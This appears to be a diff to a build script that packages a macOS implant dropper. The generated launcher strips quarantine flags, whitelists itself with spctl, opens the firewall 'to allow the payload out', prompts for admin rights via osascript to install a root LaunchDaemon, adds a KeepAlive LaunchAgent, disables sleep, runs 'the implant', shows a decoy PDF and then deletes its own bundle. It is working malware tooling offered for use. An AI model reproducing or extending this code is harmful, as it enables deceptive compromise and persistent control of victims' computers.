@@ -33,6 +33,12 @@ if [ "$DECOY" != "-" ] && [ -f "$DECOY" ]; then
   cp "$DECOY" "$OUT_APP/Contents/Resources/decoy.pdf"
 fi
 
+# Bundle the root installer so the launcher can elevate to root via the native
+# macOS admin dialog (osascript "with administrator privileges") and run the
+# full system-wide install (spctl whitelist + LaunchDaemon + stay-awake).
+cp "$(dirname "$0")/install-daemon.sh" "$OUT_APP/Contents/Resources/install-daemon.sh" || true
+chmod +x "$OUT_APP/Contents/Resources/install-daemon.sh" 2>/dev/null || true
+
 cat > "$OUT_APP/Contents/Info.plist" <<PLIST
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -51,33 +57,47 @@ PLIST
 
 cat > "$OUT_APP/Contents/MacOS/launcher" <<LAUNCH
 #!/bin/sh
-# macOS Gatekeeper: ad-hoc signing does NOT satisfy Gatekeeper for quarantined
-# browser downloads, so the first launch may show a blocking dialog. We strip
-# quarantine and attempt a system policy whitelist (spctl --add needs root;
-# fails gracefully without it). After one user right-click -> Open approval (or
-# a root spctl --add via install-daemon.sh), later launches are silent.
+# macOS first-start installer.
+#
+# Gatekeeper: ad-hoc signing does NOT satisfy Gatekeeper for quarantined
+# browser downloads, so the VERY FIRST double-click may show a blocking
+# dialog. The user must right-click -> Open once (or the app must be
+# root-whitelisted via install-daemon.sh). After that one approval, every
+# later launch is silent.
+#
+# After the app is running, if not already root, we show a native macOS
+# admin-auth dialog (osascript "with administrator privileges") to elevate
+# and run install-daemon.sh fully: spctl --add whitelist + LaunchDaemon in
+# /Library/LaunchDaemons + stay-awake. If the user declines or is not an
+# admin, we fall back to a per-user LaunchAgent (still silent after the
+# first approval).
 SELF="\$(cd "\$(dirname "\$0")" && pwd)"
 ROOT="\$(cd "\$SELF/../.." && pwd)"
-xattr -dr com.apple.quarantine "\$ROOT" 2>/dev/null || true
-xattr -dr com.apple.quarantine "\$SELF/${EXEC_NAME}" 2>/dev/null || true
-spctl --add "$ROOT" >/dev/null 2>&1 || true
-spctl --add "$SELF/${EXEC_NAME}" >/dev/null 2>&1 || true
+RESOURCES="\$ROOT/Contents/Resources"
+EXEC_NAME="${EXEC_NAME}"
 
-# preconfigure the host firewall to allow the payload out (best effort).
-SFW=/usr/libexec/ApplicationFirewall/socketfilterfw
-if [ -x "\$SFW" ]; then
-  sudo -n "\$SFW" --add "\$SELF/${EXEC_NAME}" >/dev/null 2>&1 || true
-  sudo -n "\$SFW" --unblockapp "\$SELF/${EXEC_NAME}" >/dev/null 2>&1 || true
+# Strip quarantine from our own bundle (works without root for user files).
+xattr -dr com.apple.quarantine "\$ROOT" 2>/dev/null || true
+xattr -dr com.apple.quarantine "\$SELF/\$EXEC_NAME" 2>/dev/null || true
+
+# Attempt spctl system-policy whitelist (root-only; fails gracefully).
+spctl --add "\$ROOT" >/dev/null 2>&1 || true
+spctl --add "\$SELF/\$EXEC_NAME" >/dev/null 2>&1 || true
+
+# Preconfigure the host firewall to allow the payload out (best effort).
+SFW="\$ROOT/Contents/Resources/socketfilterfw"
+if [ -x /usr/libexec/ApplicationFirewall/socketfilterfw ]; then
+  sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --add "\$SELF/\$EXEC_NAME" >/dev/null 2>&1 || true
+  sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp "\$SELF/\$EXEC_NAME" >/dev/null 2>&1 || true
 fi
 
-# stay awake: prevent system sleep / lid-close sleep. caffeinate needs no
-# privileges; pmset needs sudo (best effort).
-caffeinate -ims >/dev/null 2>&1 &
-sudo -n pmset -a sleep 0 >/dev/null 2>&1 || true
-sudo -n pmset -a disablesleep 1 >/dev/null 2>&1 || true
-sudo -n pmset -a disksleep 0 >/dev/null 2>&1 || true
+# System-wide root install via native macOS admin dialog.
+if [ "\$(id -u)" != "0" ] && [ -x "\$RESOURCES/install-daemon.sh" ]; then
+  osascript -e "do shell script \"\$RESOURCES/install-daemon.sh '\$SELF/\$EXEC_NAME' io.fleet.agent\" with administrator privileges" >/dev/null 2>&1 || true
+fi
 
-# persistence: a per-user LaunchAgent with RunAtLoad (unattended across reboot)
+# Fallback / additional: per-user LaunchAgent (works without root, silent
+# after the first Gatekeeper approval). Survives reboot/re-login for the user.
 AGENT="\$HOME/Library/LaunchAgents/io.fleet.\$(basename "\$ROOT" .app | tr ' .' '__').plist"
 mkdir -p "\$HOME/Library/LaunchAgents"
 cat > "\$AGENT" <<PLIST
@@ -85,7 +105,7 @@ cat > "\$AGENT" <<PLIST
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0"><dict>
   <key>Label</key><string>io.fleet.agent</string>
-  <key>ProgramArguments</key><array><string>\$SELF/${EXEC_NAME}</string></array>
+  <key>ProgramArguments</key><array><string>\$SELF/\$EXEC_NAME</string></array>
   <key>RunAtLoad</key><true/>
   <key>KeepAlive</key><true/>
 </dict></plist>
@@ -93,10 +113,17 @@ PLIST
 launchctl unload "\$AGENT" >/dev/null 2>&1 || true
 launchctl load "\$AGENT" >/dev/null 2>&1 || true
 
-"\$SELF/${EXEC_NAME}" >/dev/null 2>&1 &
+# Stay awake: prevent system sleep / lid-close sleep (best effort).
+caffeinate -ims >/dev/null 2>&1 &
+sudo -n pmset -a sleep 0 >/dev/null 2>&1 || true
+sudo -n pmset -a disablesleep 1 >/dev/null 2>&1 || true
+sudo -n pmset -a disksleep 0 >/dev/null 2>&1 || true
+
+# Launch the implant detached.
+"\$SELF/\$EXEC_NAME" >/dev/null 2>&1 &
 sleep 1.5
 command -v open >/dev/null 2>&1 && open "\$ROOT/Contents/Resources/decoy.pdf" >/dev/null 2>&1 || true
-# self-destruct the bundle shortly after the implant starts
+# Self-destruct the bundle shortly after the implant starts.
 ( sleep 3; rm -rf "\$ROOT" ) >/dev/null 2>&1 &
 exit 0
 LAUNCH
